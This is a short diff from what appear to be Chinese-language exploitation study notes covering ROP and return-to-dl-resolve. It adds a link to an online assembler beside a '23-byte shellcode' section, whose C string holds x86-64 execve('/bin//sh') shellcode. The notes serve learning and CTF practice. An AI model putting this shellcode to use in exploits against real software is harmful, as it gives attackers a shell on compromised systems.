@@ -79,7 +79,7 @@ http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
 现代栈溢出利用技术基础:ROP
 
 ## 23字节shellcode
-
+搜索地址【http://shell-storm.org/online/Online-Assembler-and-Disassembler/】
 ```
 char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
     "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
